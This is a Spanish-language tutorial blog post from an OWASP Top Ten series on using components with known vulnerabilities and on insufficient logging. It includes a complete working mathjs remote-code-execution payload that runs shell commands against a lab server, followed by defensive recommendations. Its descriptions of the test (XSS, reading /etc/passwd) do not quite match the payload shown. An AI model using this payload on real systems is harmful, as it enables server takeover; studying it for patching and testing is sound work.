---
layout: post
title: "Explotando vulnerabilidades conocidas y los riesgos de falta de monitoreo"
excerpt: "Explotando los 10 riesgos mas criticos segun el OWASP VIII"
image: "https://hackingprofessional.github.io/Security/images/OwaspTopTen.jpg"
tags: 
  - Vulnerabilidades Conocidas
  - Hacking NodeJS
  - Pentesting WEB
---

Hello Engineers!  
En el dia de hoy, vamos a aprender acerca de una debilidad muy usual y critica en las aplicaciones web.  

**A9 - Using Components with Known Vulnerabilities**  
Son todas aquellas vulnerabilidades que se descubrieron en componentes de código abierto y se publicaron en NVD, avisos de seguridad o rastreadores de problemas. Desde el momento de la publicación, los hackers pueden encontrar una vulnerabilidad que encuentre la documentación.  

## Conceptos Basicos  
**CVE (Common Vulnerabilities and Exposures)**  
Es una lista de información registrada sobre vulnerabilidades de seguridad conocidas, en la que cada referencia tiene un número de identificación único.1​ De esta forma ofrece una nomenclatura común para el conocimiento público de este tipo de problemas, facilitando la compartición de datos sobre dichas vulnerabilidades.  
[Articulo Completo](https://es.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures)    

**National Vulnerability Database (NVD)**  
Es el repositorio del gobierno de los EE. UU. De datos de gestión de vulnerabilidades basados ​​en estándares representados mediante el Protocolo de automatización de contenido de seguridad (SCAP). Estos datos permiten la automatización de la gestión de vulnerabilidades, la medición de seguridad y el cumplimiento. NVD incluye bases de datos de listas de verificación de seguridad, fallas de software relacionadas con la seguridad, configuraciones erróneas, nombres de productos y métricas de impacto.   
[Articulo Completo](https://en.wikipedia.org/wiki/National_Vulnerability_Database)  

## Explotando las vulnerabilidades mas criticas en aplicaciones WEB.  
## Uso de Componentes con Vulnerabilidades Conocidas  
**Escenario de la prueba #1:**   
Vamos aprender a explotar esta vulnerabilidad por medio de un formulario que usa la libreria mathjs.  

Inicialmente vamos a dirigirnos al apartado para realizar la prueba de inyeccion de XSS reflejada.  
**http://172.17.0.2:9090/app/calc**  


<figure>
  <img src="https://hackingprofessional.github.io/Security/images/calc-web.png" width="40%" height="55%">
	<figcaption>
    <a href="https://hackingprofessional.github.io/Security/images/calc-web.png" title="Formulario con funcionalidad de calculadora">Formulario con funcionalidad de calculadora</a>.
  </figcaption>
</figure>

La funcionalidad normal del formulario previamente indicado es para realizar calculos matematicos, en otras palabras es una calculadora WEB.  
La versión de la biblioteca **mathjs** utilizada en la aplicación tiene una vulnerabilidad de ejecución remota de código que permite a un atacante ejecutar código arbitrario en el servidor.  

<figure>
  <img src="https://hackingprofessional.github.io/Security/images/xss.png" width="40%" height="55%">
	<figcaption>
    <a href="https://hackingprofessional.github.io/Security/images/xss.png" title="Tabla renderizando lo cargado en el uploader">Tabla renderizando lo cargado en el uploader</a>.
  </figcaption>
</figure>

Vamos a crear un archivo JSON malicioso, con el cual obtendremos el archivo **/etc/passwd**.  
La carga util "maliciosa" que usaremos es la siguiente:  

```js
cos.constructor("spawn_sync = process.binding('spawn_sync'); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}")();cos.constructor("return spawnSync('id').output[1]")()
```  

Al cargar el archivo logramos obtener el siguiente resultado:  

<figure>
  <img src="https://hackingprofessional.github.io/Security/images/rce.png" width="40%" height="55%">
	<figcaption>
    <a href="https://hackingprofessional.github.io/Security/images/rce.png" title="Ejecutando comandos desde el aplicativo WEB">Ejecutando comandos desde el aplicativo WEB</a>.
  </figcaption>
</figure>

Con el payload anterior, logramos ejecutar el comando **id**, el cual sirve para saber uid y el usuario autenticado.  

## A10 - Insufficient Logging and Monitoring   
El registro y monitoreo insuficientes ocurren en cualquier momento:   
 - Eventos auditables, tales como los inicios de sesión, fallos en el inicio de sesión, y transacciones de alto valor no son registrados.   
 - Advertencias y errores generan registros poco claros, inadecuados o ninguno en absoluto.   
 - Registros en aplicaciones o APIs no son monitoreados para detectar actividades sospechosas.   
 - Los registros son almacenados únicamente de forma local.   
 - Los umbrales de alerta y de escalamiento de respuesta no están implementados o no son eficaces. • Las pruebas de penetración y escaneos utilizando herramientas DAST (como OWASP ZAP) no generan alertas.   
 - La aplicación no logra detectar, escalar o alertar sobre ataques en tiempo real.  


## Recomendaciones para el A9  
Remover dependencias, funcionalidades, componentes, archivos y documentación innecesaria y no utilizada.  
  - Utilizar una herramienta para mantener un inventario de versiones de componentes (por ej. frameworks o bibliotecas) tanto del cliente como del servidor.  
  - Monitorizar continuamente fuentes como CVE y NVD en búsqueda de vulnerabilidades en los componentes utilizados.  
  - Utilizar herramientas de análisis automatizados. Suscribirse a alertas de seguridad de los componentes utilizados.    
  - Supervisar bibliotecas y componentes que no poseen mantenimiento o no liberan parches de seguridad para sus versiones obsoletas o sin soporte. Si el parcheo no es posible, considere desplegar un parche virtual para monitorizar, detectar o protegerse contra la debilidad detectada.  

## Recomendaciones para el A10  
Según el riesgo de los datos almacenados o procesados por la aplicación:  
  - Asegúrese de que todos los errores de inicio de sesión, de control de acceso y de validación de entradas de datos del lado del servidor se pueden registrar para identificar cuentas sospechosas. Mantenerlo durante el tiempo suficiente para permitir un eventual análisis forense.   
  - Asegúrese de que las transacciones de alto impacto tengan una pista de auditoría con controles de integridad para prevenir alteraciones o eliminaciones.  
  - Asegúrese que todas las transacciones de alto valor poseen una traza de auditoría con controles de integridad que permitan detectar su modificación o borrado, tales como una base de datos con permisos de inserción únicamente u similar.  

## Aprende hacking explotando las vulnerabilidades mas criticas en aplicaciones WEB.  

 - [A1: Inyección](https://hackingprofessional.github.io/Security/Como-realizar-una-inyeccion-SQL-OWASP-I)   
 - [A2: Pérdida de Autenticación](https://hackingprofessional.github.io/Security/Perdida-de-autenticacion-y-exposicion-de-datos-OWASP-II)  
 - [A3: Exposición de datos sensibles](https://hackingprofessional.github.io/Security/Perdida-de-autenticacion-y-exposicion-de-datos-OWASP-II)  
 - [A4: Entidades Externas XML (XXE)](https://hackingprofessional.github.io/Security/Como-realizar-una-inyeccion-XML-OWASP-III)  
 - [A5: Pérdida de Control de Acceso](https://hackingprofessional.github.io/Security/Evadiendo-controles-de-acceso-OWASP-IV)  
 - [A6: Configuración de Seguridad Incorrecta](https://hackingprofessional.github.io/Security/El-riesgo-de-las-Configuraciones-Incorrectas-de-Seguridad-OWAPS-V/)  
 - [A7: Secuencia de Comandos en Sitios Cruzados (XSS)](https://hackingprofessional.github.io/Security/Aprende-a-realizar-una-inyeccion-XSS-OWASP-VI)  
 - [A8: Deserialización Insegura](https://hackingprofessional.github.io/Security/Aprende-que-es-Deserializacion-Insegura-OWASP-VII/)  
 - [A9: Componentes con vulnerabilidades conocidas](https://hackingprofessional.github.io/Security/Explotando-vulnerabilidades-conocidas-OWASP-VIII)  
 - [A10: Registro y Monitoreo Insuficientes](https://hackingprofessional.github.io/Security/Explotando-vulnerabilidades-conocidas-OWASP-VIII)  



 [Para mas informacion leer el siguiente PDF publicado por el OWASP](https://www.owasp.org/images/5/5e/OWASP-Top-10-2017-es.pdf)